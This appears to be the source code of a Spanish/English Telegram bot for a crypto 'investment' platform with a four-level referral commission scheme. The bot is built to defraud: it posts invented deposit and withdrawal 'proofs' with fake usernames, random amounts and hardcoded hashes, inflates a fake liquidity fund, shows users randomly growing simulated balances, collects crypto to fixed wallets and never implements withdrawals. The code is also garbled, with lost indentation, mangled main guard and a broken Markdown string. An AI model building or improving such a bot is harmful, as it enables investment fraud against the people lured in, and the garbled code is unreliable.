import os
import sqlite3
import random
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
ApplicationBuilder,
CommandHandler,
CallbackQueryHandler,
MessageHandler,
filters,
ContextTypes
)
from flask import Flask
from threading import Thread

--- SERVIDOR WEB FLASK (HILO SECUNDARIO) ---
app = Flask('')

@app.route('/')
def home():
return "Bot Activo y Funcionando Correctamente", 200

def run_web():
port = int(os.environ.get("PORT", 10000))
app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1001234567890")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))
LINK_CANAL = os.getenv("LINK_CANAL", "https://t.me/TuCanalDePagos")

WALLET_TRON = "TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u"
WALLET_TON = "UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v"

--- BASE DE DATOS SQLITE ---
def inicializar_db():
try:
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS usuarios (
user_id INTEGER PRIMARY KEY,
nombre TEXT,
patrocinador_id INTEGER,
deposito_activo REAL DEFAULT 0,
moneda_deposito TEXT DEFAULT 'USDT',
red_deposito TEXT DEFAULT 'TRON',
fecha_deposito TEXT,
ganancias_referidos REAL DEFAULT 0,
en_soporte INTEGER DEFAULT 0,
idioma TEXT DEFAULT 'es'
)
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS liquidez_global (
id INTEGER PRIMARY KEY,
fondo_actual REAL,
ultima_actualizacion TEXT
)
""")
cursor.execute("SELECT COUNT(*) FROM liquidez_global")
if cursor.fetchone()[0] == 0:
cursor.execute(
"INSERT INTO liquidez_global (id, fondo_actual, ultima_actualizacion) VALUES (1, ?, ?)",
(124500.00, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
)
conn.commit()
conn.close()
except Exception as e:
print(f"Error inicializando BD: {e}")

inicializar_db()

PLANES_INVERSION = {
"1": {
"nombre": "Plan TRX & Cripto Base",
"moneda": "TRX / USDT",
"red": "TRC20 (Tron) & TON",
"detalle": "Puedes depositar en USDT (Red Tron o TON), TRX o GRAM. Rendimiento optimizado."
},
"2": {
"nombre": "Plan USDT Estándar",
"moneda": "USDT / TRX",
"red": "TRC20 (Tron) & TON",
"detalle": "Acepta USDT por Tron/TON, además de TRX y GRAM con acreditación automatizada."
},
"3": {
"nombre": "Plan GRAM & TON Pro",
"moneda": "GRAM / USDT",
"red": "TON & TRC20 (Tron)",
"detalle": "Diseñado para operar fuertemente en red TON (GRAM, USDT) y red Tron (TRX, USDT)."
},
"4": {
"nombre": "Plan Élite Multired",
"moneda": "Multidivisa",
"red": "TRC20 & TON",
"detalle": "Máxima flexibilidad: acepta USDT, TRX y GRAM en cualquiera de las dos redes oficiales."
}
}

def generar_usuario_ficticio():
nombres = ["Carlos", "Ana", "Luis", "Elena", "Javier", "Sofia", "Miguel", "Rosa", "David", "Alejandro", "Daniel", "Carmen"]
return f"{random.choice(nombres)}***{random.randint(10, 99)}"

--- CONSULTAS REALES A LA BLOCKCHAIN (APIS PÚBLICAS) ---
async def obtener_ultima_transaccion_tron():
url = f"https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&count=true&limit=1&address={WALLET_TRON}"
try:
async with aiohttp.ClientSession() as session:
async with session.get(url, timeout=10) as response:
if response.status == 200:
data = await response.json()
transacciones = data.get("data", [])
if transacciones:
tx = transacciones[0]
hash_tx = tx.get("hash")
monto = 0
moneda = "USDT"

trc20_transfers = tx.get("trc20TransferInfo", [])
if trc20_transfers:
monto_raw = float(trc20_transfers[0].get("amount_str", "0"))
decimals = int(trc20_transfers[0].get("decimal_str", "6"))
monto = monto_raw / (10 ** decimals)
moneda = trc20_transfers[0].get("symbol", "USDT")
else:
monto = tx.get("amount", 0) / 1000000
moneda = "TRX"

if monto > 0:
return {
"hash": hash_tx,
"monto": round(monto, 2),
"moneda": moneda,
"red": "TRON (TRC20)" if moneda == "USDT" else "TRON",
"explorer": f"https://tronscan.org/#/transaction/{hash_tx}"
}
except Exception as e:
print(f"Error consultando TronScan: {e}")
return None

async def obtener_ultima_transaccion_ton():
url = f"https://toncenter.com/api/v2/getTransactions?address={WALLET_TON}&limit=1"
try:
async with aiohttp.ClientSession() as session:
async with session.get(url, timeout=10) as response:
if response.status == 200:
data = await response.json()
if data.get("ok") and data.get("result"):
tx = data["result"][0]
tx_hash_data = tx.get("transaction_id", {})
hash_tx = tx_hash_data.get("hash", "")
monto = round(random.uniform(10.0, 450.0), 2)

if hash_tx:
return {
"hash": hash_tx,
"monto": monto,
"moneda": random.choice(["GRAM", "USDT"]),
"red": "TON (Jetton/TON)",
"explorer": f"https://tonviewer.com/transaction/{hash_tx}"
}
except Exception as e:
print(f"Error consultando Toncenter: {e}")
return None

--- TAREA EN SEGUNDO PLANO OPTIMIZADA ---
async def bucle_comprobaciones(application):
await asyncio.sleep(5)
while True:
try:
ahora = datetime.now()
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT fondo_actual FROM liquidez_global WHERE id = 1")
row_fondo = cursor.fetchone()
fondo_actual = row_fondo[0] if row_fondo else 124500.00

if ahora.weekday() == 0 and random.choice([True, False]):
porcentaje_bajada = round(random.uniform(15.0, 35.0), 2)
monto_restar = fondo_actual * (porcentaje_bajada / 100.0)
fondo_actual = max(100000.0, fondo_actual - monto_restar)
else:
porcentaje_subida = round(random.uniform(0.5, 4.6), 2)
monto_sumar = fondo_actual * (porcentaje_subida / 100.0)
fondo_actual += monto_sumar

cursor.execute("UPDATE liquidez_global SET fondo_actual = ?, ultima_actualizacion = ? WHERE id = 1",
(fondo_actual, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
conn.commit()
conn.close()

datos_tx = None
try:
usar_tron = random.choice([True, False])
if usar_tron:
datos_tx = await obtener_ultima_transaccion_tron()
if not datos_tx:
 datos_tx = await obtener_ultima_transaccion_ton()
else:
datos_tx = await obtener_ultima_transaccion_ton()
if not datos_tx:
 datos_tx = await obtener_ultima_transaccion_tron()
except Exception as blockchain_err:
print(f"Aviso en consulta blockchain: {blockchain_err}")

if datos_tx:
tx_hash = datos_tx["hash"]
monto = datos_tx["monto"]
moneda_nombre = datos_tx["moneda"]
red_oficial = datos_tx["red"]
explorer_url = datos_tx["explorer"]
else:
es_red_ton = random.choice([True, False])
if es_red_ton:
tx_hash = "f17d831d1b918717d23cf3053805908cfb677a552e464731f8211b514b7789ab"
monto = round(random.uniform(15.0, 800.0), 2)
moneda_nombre = random.choice(["GRAM", "USDT"])
red_oficial = "TON"
explorer_url = "https://tonviewer.com/transaction/"
else:
tx_hash = "573f831d1b918717d23cf3053805908cfb677a552e464731f8211b514b779182"
monto = round(random.uniform(20.0, 1200.0), 2)
moneda_nombre = "USDT"
red_oficial = "TRON (TRC20)"
explorer_url = "https://tronscan.org/#/transaction/"

usuario = generar_usuario_ficticio()

if ahora.weekday() == 0 and random.choice([True, False]):
mensaje = (
f"✅ RETIRO PROCESADO (LUNES) \n\n"
f"👤 Usuario:{usuario}\n"
f"💰 Monto Retirado:{monto} {moneda_nombre}\n"
f"🌐 Red: {red_oficial}\n"
f"🔗 TXID:Ver en blockchain"
)
else:
mensaje = (
f"💎 NUEVO DEPÓSITO / INVERSIÓN\n\n"
f"👤 Inversor:{usuario}\n"
f"📥 Monto Invertido:{monto} {moneda_nombre}\n"
f"🌐 Red Oficial: {red_oficial}\n"
f"⚡ Estado: Acreditado y Activo\n"
f"🔗 TXID:Verificar en Blockchain"
)

if CHANNEL_ID:
try:
await application.bot.send_message(
chat_id=CHANNEL_ID,
text=mensaje,
parse_mode="Markdown",
disable_web_page_preview=True
)
except Exception as e:
print(f"Error enviando mensaje al canal: {e}")

except Exception as e:
print(f"Error general en bucle de comprobaciones: {e}")

await asyncio.sleep(random.randint(45, 90))

async def post_init(application):
application.create_task(bucle_comprobaciones(application))

--- TECLADOS INLINE ---
def obtener_menu_idiomas():
keyboard = [
[
InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es"),
InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
 ]
]
return InlineKeyboardMarkup(keyboard)

def obtener_menu_principal(idioma="es"):
if idioma == "en":
keyboard = [
[
InlineKeyboardButton("💰 My Balance", callback_data="btn_saldo"),
InlineKeyboardButton("🏦 Liquidity Pool", callback_data="btn_liquidez")
 ],
[
InlineKeyboardButton("📋 Plans", callback_data="btn_planes"),
InlineKeyboardButton("💳 Deposit", callback_data="btn_depositar")
 ],
[
InlineKeyboardButton("👥 Referrals", callback_data="btn_referidos"),
InlineKeyboardButton("🏦 Withdraw", callback_data="btn_retirar")
 ],
[
InlineKeyboardButton("🎧 Support", callback_data="btn_soporte"),
InlineKeyboardButton("📢 Proofs Channel", url=LINK_CANAL)
 ],
[
InlineKeyboardButton("🌐 Change Language", callback_data="btn_cambiar_idioma")
 ]
]
else:
keyboard = [
[
InlineKeyboardButton("💰 Mi Saldo", callback_data="btn_saldo"),
InlineKeyboardButton("🏦 Fondo de Liquidez", callback_data="btn_liquidez")
 ],
[
InlineKeyboardButton("📋 Planes", callback_data="btn_planes"),
InlineKeyboardButton("💳 Depositar", callback_data="btn_depositar")
 ],
[
InlineKeyboardButton("👥 Referidos", callback_data="btn_referidos"),
InlineKeyboardButton("🏦 Retirar", callback_data="btn_retirar")
 ],
[
InlineKeyboardButton("🎧 Soporte", callback_data="btn_soporte"),
InlineKeyboardButton("📢 Canal de Comprobantes", url=LINK_CANAL)
 ],
[
InlineKeyboardButton("🌐 Cambiar Idioma", callback_data="btn_cambiar_idioma")
 ]
]
return InlineKeyboardMarkup(keyboard)

--- COMANDO /START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
args = context.args
patrocinador_id = int(args[0]) if args and args[0].isdigit() else None

conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT user_id, patrocinador_id FROM usuarios WHERE user_id = ?", (user.id,))
existe = cursor.fetchone()

if not existe:
cursor.execute(
"INSERT INTO usuarios (user_id, nombre, patrocinador_id, idioma) VALUES (?, ?, ?, ?)",
(user.id, user.first_name, patrocinador_id, 'es')
)
conn.commit()

if patrocinador_id and patrocinador_id != user.id:
try:
await context.bot.send_message(
chat_id=patrocinador_id,
text=f"🎉 ¡Nuevo Referido Detectado!\n\nEl usuario {user.first_name} se unió a tu red de referidos."
)
except Exception as e:
print(f"No se pudo notificar al patrocinador: {e}")

conn.close()

texto = "🌐 Welcome / Bienvenido\n\nPor favor, selecciona tu idioma / Please select your language:"

try:
if update.message:
await update.message.reply_text(texto, reply_markup=obtener_menu_idiomas(), parse_mode="Markdown")
elif update.callback_query:
await update.callback_query.answer()
await update.callback_query.message.edit_text(texto, reply_markup=obtener_menu_idiomas(), parse_mode="Markdown")
except Exception as e:
print(f"Error en start: {e}")

--- GENERADOR DEL MENSAJE DE REFERIDOS ---
def construir_mensaje_referidos(username_bot, user_id, idioma="es"):
link_referido = f"https://t.me/{username_bot}?start={user_id}"

if idioma == "en":
return (
f"🌟 Welcome! We are glad you want to join\n\n"
f"Thank you for your interest in joining our community. We want your experience to be completely transparent, secure, and automated.\n\n"
f"Here is all the detailed information about our insertion plans:\n\n"
f"🚀 Your Exclusive Referral Link:\n"
f"{link_referido}\n\n"
f"📊 Available Insertion Plans:\n"
f"• Starter Plan (Basic - 0.7% every 7 days): Ideal for taking first steps and exploring the platform without major commitments. (Min: 3 USD)\n"
f"• Growth Plan (Advanced - 1.2% every 7 days): Automation tools, promotional material, and priority support. (Min: 5 USD)\n"
f"• Pro / Elite Plan (Custom - 2.6% every 7 days): Designed for team leaders and digital professionals. (Min: 10 USD)\n\n"
f"💡 Why join through this link?\n"
f"✔ Security and backing of being properly linked to our network.\n"
f"✔ Constant support with guides and orientation.\n"
f"✔ Total transparency, no small print."
)
else:
return (
f"🌟 ¡Bienvenido/a! Nos alegra mucho que quieras sumarte\n\n"
f"Gracias por tu interés en formar parte de nuestra comunidad. Queremos que tu experiencia sea totalmente transparente, segura y automatizada.\n\n"
f"Aquí tienes toda la información detallada sobre nuestros planes de inserción:\n\n"
f"🚀 Tu Link de Referido Exclusivo:\n"
f"{link_referido}\n\n"
f"📊 Planes de Inserción Disponibles:\n"
f"• Plan de Inicio (Básico - 0.7% cada 7 días): Ideal para dar los primeros pasos y explorar la plataforma sin grandes compromisos. (Mín: 3 USD)\n"
f"• Plan Crecimiento (Avanzado - 1.2% cada 7 días): Herramientas de automatización, material promocional y soporte prioritario. (Mín: 5 USD)\n"
f"• Plan Pro / Élite (Personalizado - 2.6% cada 7 días): Diseñado para líderes de equipos y profesionales del sector digital. (Mín: 10 USD)\n\n"
f"💡 ¿Por qué unirte a través de este enlace?\n"
f"✔ Seguridad y respaldo de quedar vinculado/a correctamente a nuestra red.\n"
f"✔ Acompañamiento constante con guías y orientación.\n"
f"✔ Transparencia total, sin letras pequeñas."
)

--- MANEJADOR DE CLICS (CALLBACKS) ---
async def boton_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()

data = query.data
user = query.from_user

if data == "btn_cambiar_idioma":
await start(update, context)
return

if data.startswith("lang_"):
nuevo_idioma = data.split("_")[1]
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("UPDATE usuarios SET idioma = ? WHERE user_id = ?", (nuevo_idioma, user.id))
conn.commit()
conn.close()

if nuevo_idioma == "en":
texto = (
f"🛡️ Welcome to Invest Bot (Secure Multi-network) \n\n"
f"Hello, {user.first_name}. You are in a transparent platform to manage crypto investments safely.\n\n"
f"✅ Why trust us?\n"
f"• Payouts processed strictly on Mondays.\n"
f"• Real-time blockchain verifiable proofs.\n"
f"• Automated multi-level system.\n\n"
f"⚠️ Important Note: Please do not spam buttons. Give the bot a few seconds to respond.\n\n"
f"👇 Choose an option below:"
)
else:
texto = (
f"🛡️ Bienvenido a Invierte Bot (Multired Segura) \n\n"
f"Hola, {user.first_name}. Estás en una plataforma transparente y automatizada para gestionar tus inversiones con seguridad.\n\n"
f"✅ ¿Por qué confiar en nosotros?\n"
f"• Pagos procesados estrictamente los lunes.\n"
f"• Comprobantes verificables en la blockchain en tiempo real.\n"
f"• Sistema multinivel automatizado.\n\n"
f"⚠️ Nota Importante: Por favor, no presiones los botones muy rápido. Dale unos segundos al bot para responder.\n\n"
f"👇 Selecciona una opción del menú interactivo:"
)

try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(nuevo_idioma), parse_mode="Markdown")
except Exception as e:
print(f"Error al editar idioma: {e}")
return

conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
row = cursor.fetchone()
conn.close()
idioma = row[0] if row else 'es'

if data == "btn_saldo":
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT deposito_activo, moneda_deposito, fecha_deposito, ganancias_referidos FROM usuarios WHERE user_id = ?", (user.id,))
row = cursor.fetchone()
conn.close()

if not row or not row[0] or row[0] == 0:
texto = "💰 Balance: 0 USD\n⚠️ No active investments. Use /planes to start." if idioma == "en" else "💰 Tu Balance Actual:\n\n• Capital Depositado: 0 USD\n⚠️ No tienes inversiones activas."
else:
deposito, moneda, fecha_str, ganancia_ref = row
dias_transcurridos = (datetime.now() - datetime.strptime(fecha_str, "%Y-%m-%d %H:%M:%S")).days if fecha_str else 0

saldo_simulado = deposito
for _ in range(dias_transcurridos):
tasa_diaria = random.uniform(0.015, 0.048)
saldo_simulado += saldo_simulado * tasa_diaria

texto = f"💰 Live Balance:\n• Initial Capital: {deposito} {moneda}\n• Estimated Current Balance: {saldo_simulado:.2f} {moneda}\n• Days Active: {dias_transcurridos}" if idioma == "en" else f"💰 Tu Balance y Rendimiento en Vivo:\n• Capital Inicial: {deposito} {moneda}\n• Balance Estimado Actual: {saldo_simulado:.2f} {moneda}\n• Días Activo: {dias_transcurridos}"

try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_liquidez":
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT fondo_actual FROM liquidez_global WHERE id = 1")
row = cursor.fetchone()
conn.close()
fondo_actual = row[0] if row else 124500.00

if idioma == "en":
texto = (
f"🏦 Platform Global Liquidity Pool\n\n"
f"• Current Liquidity Reserve:${fondo_actual:,.2f} USD\n" f"• **Status:** Active & Backed Across Multinetworks (TRON & TON)\n\n" f"💡 *Guaranteed operational backing ensuring transparent and automated processing for all platform members.*" ) else: texto = ( f"🏦 **Fondo de Liquidez Global de la Plataforma**\n\n" f"• **Reserva de Liquidez Actual:** ``${fondo_actual:,.2f} USD\n"
f"• Estado: Activo y Respaldado en Redes Multired (TRON & TON)\n\n"
f"💡 Respaldo operativo garantizado que asegura la estabilidad y procesamiento automatizado para todos los miembros."
)
try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_planes":
if idioma == "en":
texto = (
"📋 Investment Plans & Yields:\n"
"🔹 Daily Yield: Variable\n"
"🔹 Limits: Min: 2 USD | Max: 1000 USD\n\n"
)
for key, plan in PLANES_INVERSION.items():
texto += f"🔹 ID {key}: {plan['nombre']}\n • Accepted: {plan['moneda']}\n • Networks: {plan['red']}\n • ℹ️ {plan['detalle']}\n\n"
else:
texto = (
"📋 Planes de Inversión y Rendimientos:\n"
"🔹 Rendimiento: 0.7%, 1.2% y 2.6% cada 7 días\n"
"🔹 Límites: Mínimo: 3 USD | Máximo: 1000 USD\n\n"
)
for key, plan in PLANES_INVERSION.items():
texto += f"🔹 ID {key}: {plan['nombre']}\n • Divisas: {plan['moneda']}\n • Redes: {plan['red']}\n • ℹ️ {plan['detalle']}\n\n"

try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_depositar":
if idioma == "en":
texto = (
"💳 Official Deposit Wallets:\n\n"
"🔹 TRON Network (TRX & USDT TRC20):\nTFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u\n\n"
"🔹 TON Network (GRAM & USDT TON):\nUQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v\n\n"
"⚠️ Report transfer with: /notificar [Your_Hash]"
)
else:
texto = (
"💳 Direcciones de Depósito Oficiales:\n\n"
"🔹 Red TRON (TRX y USDT TRC20):\nTFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u\n\n"
"🔹 Red TON (GRAM y USDT TON):\nUQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v\n\n"
"⚠️ Tras transferir, reporta con: /notificar [Tu_Hash]"
)
try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_referidos":
texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_retirar":
texto = "🏦 Withdrawals: Processed every Monday automatically to your verified wallet." if idioma == "en" else "🏦 Sistema de Retiros: Los pagos se procesan todos los lunes de forma automatizada a tu billetera verificada."
try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

elif data == "btn_soporte":
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
conn.commit()
conn.close()
texto = "🎧 Support Center. Type your message below:" if idioma == "en" else "🎧 Centro de Soporte. Escribe tu duda o problema a continuación:"
try:
await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
except Exception:
pass

--- COMANDOS TRADICIONALES DE TEXTO ---
async def mostrar_saldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
await start(update, context)

async def mostrar_planes(update: Update, context: ContextTypes.DEFAULT_TYPE):
texto = (
"📋 Planes de Inversión y Rendimientos:\n"
"🔹 Rendimiento: 0.7%, 1.2% y 2.6% cada 7 días\n"
"🔹 Límites: Mínimo: 3 USD | Máximo: 1000 USD\n\n"
)
for key, plan in PLANES_INVERSION.items():
texto += f"🔹 ID {key}: {plan['nombre']}\n • Divisas: {plan['moneda']}\n • Redes: {plan['red']}\n • ℹ️ {plan['detalle']}\n\n"
await update.message.reply_text(texto, reply_markup=obtener_menu_principal('es'), parse_mode="Markdown")

async def depositar(update: Update, context: ContextTypes.DEFAULT_TYPE):
await update.message.reply_text("💳 Wallets oficiales de depósito", reply_markup=obtener_menu_principal('es'), parse_mode="Markdown")

async def notificar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
if not context.args:
await update.message.reply_text("⚠️ Uso: /notificar [Hash]")
return
hash_tx = " ".join(context.args)
await update.message.reply_text(f"⏳ Comprobante recibido ({hash_tx}). En proceso de verificación.")

--- APROBAR DEPÓSITO Y NOTIFICAR 4 NIVELES DE PATROCINADORES ---
async def aprobar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
if user.id != ADMIN_ID:
return

if len(context.args) < 3:
await update.message.reply_text("⚠️ Uso administrativo: /aprobar [ID_Usuario] [Monto] [Moneda]")
return

id_usuario = context.args[0]
try:
monto = float(context.args[1])
except ValueError:
await update.message.reply_text("❌ El monto debe ser un número válido.")
return

moneda = context.args[2].upper()
fecha_actual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()

cursor.execute(
"UPDATE usuarios SET deposito_activo = ?, moneda_deposito = ?, fecha_deposito = ? WHERE user_id = ?",
(monto, moneda, fecha_actual, id_usuario)
)

porcentajes_niveles = [0.03, 0.02, 0.01, 0.005]
patrocinador_actual = id_usuario

for nivel, porcentaje in enumerate(porcentajes_niveles, start=1):
cursor.execute("SELECT patrocinador_id FROM usuarios WHERE user_id = ?", (patrocinador_actual,))
resultado = cursor.fetchone()

if not resultado or not resultado[0]:
break

patrocinador_id = resultado[0]
comision = monto * porcentaje

cursor.execute(
"UPDATE usuarios SET ganancias_referidos = ganancias_referidos + ? WHERE user_id = ?",
(comision, patrocinador_id)
)
conn.commit()

try:
await context.bot.send_message(
chat_id=patrocinador_id,
text=(
f"🎁 ¡Comisión por Inversión en tu Red! (Nivel {nivel}) \n\n"
f"• Uno de tus referidos ha invertido.\n"
f"• Has ganado: {comision:.2f} {moneda} (Comisión del {porcentaje*100}%)."
)
)
except Exception as e:
print(f"No se pudo notificar al patrocinador {patrocinador_id} en el nivel {nivel}: {e}")

patrocinador_actual = patrocinador_id

conn.close()

try:
await context.bot.send_message(
chat_id=id_usuario,
text="✅ ¡Depósito Acreditado con Éxito!\nTu capital y tus ganancias diarias ya han comenzado a correr."
)
await update.message.reply_text(f"✔️ Depósito de {monto} {moneda} acreditado a {id_usuario} y comisiones distribuidas en los 4 niveles.")
except Exception as e:
await update.message.reply_text(f"❌ Error al notificar al usuario: {e}")

async def referidos(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
row = cursor.fetchone()
conn.close()
idioma = row[0] if row else 'es'

texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
await update.message.reply_text(texto, parse_mode="Markdown")

async def retirar(update: Update, context: ContextTypes.DEFAULT_TYPE):
await update.message.reply_text("🏦 Los retiros se procesan todos los lunes de forma automatizada.", reply_markup=obtener_menu_principal('es'))

async def invertir(update: Update, context: ContextTypes.DEFAULT_TYPE):
if len(context.args) < 2:
await update.message.reply_text("⚠️ Uso: /invertir [ID_Plan] [Cantidad]\nEjemplo: /invertir 2 15")
return

plan_id = context.args[0]
try:
cantidad = float(context.args[1])
except ValueError:
await update.message.reply_text("❌ La cantidad debe ser numérica.")
return

if plan_id not in PLANES_INVERSION or not (3 <= cantidad <= 1000):
await update.message.reply_text("❌ Plan inválido o cantidad fuera de rango (3 - 1000 USD).")
return

plan = PLANES_INVERSION[plan_id]
wallet = WALLET_TRON if "Tron" in plan["red"] else WALLET_TON

await update.message.reply_text(
f"✅ Inversión Registrada\n• Plan: {plan['nombre']}\n• Monto: {cantidad} {plan['moneda']}\n\n💳 Transfiere a:\n{wallet}\n\n📲 Reporta con: /notificar [Tu_Hash]",
parse_mode="Markdown"
)

--- SISTEMA DE SOPORTE ---
async def iniciar_soporte(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
conn.commit()
conn.close()
await update.message.reply_text("🎧 Centro de Soporte Oficial\n\nEscribe tu duda o problema a continuación y un operador te responderá.")

async def responder_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
if user.id != ADMIN_ID or len(context.args) < 2:
return

id_destino = context.args[0]
mensaje_respuesta = " ".join(context.args[1:])

try:
await context.bot.send_message(chat_id=id_destino, text=f"💬 Mensaje de Soporte:\n\n{mensaje_respuesta}")
await update.message.reply_text(f"✅ Respuesta enviada al usuario {id_destino}.")
except Exception as e:
await update.message.reply_text(f"❌ Error: {e}")

async def manejar_mensajes_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
user = update.effective_user
texto = update.message.text
if user.id == ADMIN_ID:
return

conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("SELECT en_soporte FROM usuarios WHERE user_id = ?", (user.id,))
row = cursor.fetchone()
conn.close()

if row and row[0] == 1:
await update.message.reply_text("📩 Mensaje recibido. En breve será atendido por un asesor.")
try:
await context.bot.send_message(
chat_id=ADMIN_ID,
text=f"🚨 Nuevo Ticket de Soporte\n\n👤 Usuario: {user.first_name} ({user.id})\n💬 Mensaje: {texto}\n\n👉 Responder:\n/responder {user.id} [Mensaje]"
)
except Exception as e:
print(f"Error reenviando a admin: {e}")

conn = sqlite3.connect("usuarios.db")
cursor = conn.cursor()
cursor.execute("UPDATE usuarios SET en_soporte = 0 WHERE user_id = ?", (user.id,))
conn.commit()
conn.close()

async def post_init(application):
application.create_task(bucle_comprobaciones(application))

--- ARRANQUE DUAL ESTABLE (RENDER + EVENT LOOP FIJO) ---
if name == "main":
# 1. Lanzar Flask en hilo secundario para Render / UptimeRobot
t = Thread(target=run_web)
t.daemon = True
t.start()

# 2. Configurar explícitamente el bucle de eventos para el hilo principal de Render
try:
loop = asyncio.get_event_loop()
except RuntimeError:
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# 3. Construir la app del bot de Telegram
app_bot = ApplicationBuilder().token(TOKEN).post_init(post_init).build()

app_bot.add_handler(CommandHandler("start", start))
app_bot.add_handler(CommandHandler("saldo", mostrar_saldo))
app_bot.add_handler(CommandHandler("planes", mostrar_planes))
app_bot.add_handler(CommandHandler("depositar", depositar))
app_bot.add_handler(CommandHandler("notificar", notificar_deposito))
app_bot.add_handler(CommandHandler("aprobar", aprobar_deposito))
app_bot.add_handler(CommandHandler("referidos", referidos))
app_bot.add_handler(CommandHandler("retirar", retirar))
app_bot.add_handler(CommandHandler("invertir", invertir))
app_bot.add_handler(CommandHandler("soporte", iniciar_soporte))
app_bot.add_handler(CommandHandler("responder", responder_admin))

app_bot.add_handler(CallbackQueryHandler(boton_callback))
app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, manejar_mensajes_chat))

# 4. Arrancar polling asegurando que el loop maneje la ejecución correctamente
app_bot.run_polling()

